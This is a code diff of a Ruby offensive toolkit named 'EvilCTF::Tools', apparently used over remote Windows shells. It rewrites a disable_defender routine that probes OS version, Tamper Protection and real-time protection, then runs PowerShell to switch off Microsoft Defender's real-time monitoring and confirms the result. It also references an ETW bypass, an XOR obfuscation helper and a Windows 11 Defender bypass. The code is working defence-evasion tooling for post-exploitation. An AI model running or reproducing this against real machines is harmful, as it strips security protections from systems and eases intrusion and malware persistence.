@@ -249,6 +249,65 @@ module EvilCTF::Tools
     } catch {}
     "[+] Full ETW bypass completed"
   PS
+
+  def self.disable_defender(shell)
+  # Check OS version
+  os_info = shell.run('systeminfo | findstr /i "os name"').output.strip
+  if os_info.include?("Windows 10")
+    puts "[*] OS: Windows 10 detected. Running standard Defender disable..."
+  elsif os_info.include?("Windows 11")
+    puts "[!] WARNING: This technique only works on Windows 10."
+    puts "    On Windows 11, use `tool win11_defender_bypass` or `wscript` bypass."
+    puts "    See: https://github.com/aventurella/Win11-Defender-Bypass"
+    return
+  else
+    puts "[!] Unknown OS: #{os_info}"
+    return
+  end
+
+  # Check for Tamper Protection
+  tamper_check = shell.run('Get-MpComputerStatus | Select-Object IsTamperProtected')
+  if tamper_check.output.include?('True')
+    puts "[!] Tamper Protection Enabled, will try anyways"
+  end
+
+  # Check Real-Time Protection
+  status = shell.run('Get-MpComputerStatus | Select-Object -ExpandProperty RealTimeProtectionEnabled')
+  if status.output.strip == 'True'
+    puts "[*] Real-time protection is currently enabled"
+  else
+    puts "[-] Defender is already disabled"
+    return
+  end
+
+  # Attempt to disable
+  ps_cmd = <<~PS
+    try {
+      $defender = Get-MpComputerStatus
+      if ($defender.RealTimeProtectionEnabled) {
+        Set-MpPreference -DisableRealtimeMonitoring $true
+        Write-Output "[+] Defender real-time monitoring disabled"
+      } else {
+        Write-Output "[-] Defender already disabled"
+      }
+    } catch {
+      Write-Output "[!] Failed to disable Defender: $($_.Exception.Message)"
+    }
+  PS
+
+  result = shell.run(ps_cmd)
+  puts result.output
+
+  # Final check: is Defender still enabled?
+  final_status = shell.run('Get-MpComputerStatus | Select-Object -ExpandProperty RealTimeProtectionEnabled')
+  if final_status.output.strip == 'True'
+    puts "[!] WARNING: Defender is still enabled after attempted disable."
+  else
+    puts "[+] Defender successfully disabled"
+  end
+end  
+  
+  
   class CommandManager
     def initialize
       @aliases = {
@@ -653,7 +712,7 @@ module EvilCTF::Tools
   end
   def self.get_system_architecture(shell)
     result = shell.run('$env:PROCESSOR_ARCHITECTURE')
-    arch = result.output.strip.downcase
+    arch = result.output.strip
    
     if arch.include?('64')
       'x64'
@@ -719,35 +778,6 @@ module EvilCTF::Tools
     data.bytes.map { |b| (b ^ key).chr }.join
   end
   
-  def self.disable_defender(shell)
-    # Check OS version
-    os_info = shell.run('systeminfo | findstr /i "os name"').output.strip
-    if os_info.include?("Windows 10")
-      puts "[*] OS: Windows 10 detected. Running standard Defender disable..."
-      ps_cmd = <<~PS
-        try {
-          $defender = Get-MpComputerStatus
-          if ($defender.RealTimeProtectionEnabled) {
-            Set-MpPreference -DisableRealtimeMonitoring $true
-            Write-Output "[+] Defender real-time monitoring disabled"
-          } else {
-            Write-Output "[-] Defender already disabled"
-          }
-        } catch {
-          Write-Output "[!] Failed to disable Defender: $($_.Exception.Message)"
-        }
-      PS
-      result = shell.run(ps_cmd)
-      puts result.output
-    elsif os_info.include?("Windows 11")
-      puts "[!] WARNING: This technique only works on Windows 10."
-      puts "    On Windows 11, use `tool win11_defender_bypass` or `wscript` bypass."
-      puts "    See: https://github.com/aventurella/Win11-Defender-Bypass"
-    else
-      puts "[!] Unknown OS: #{os_info}"
-    end
-  end
-
 
   def self.load_config_profile(name)
     profile_file = File.join('config', "#{name}.yaml")
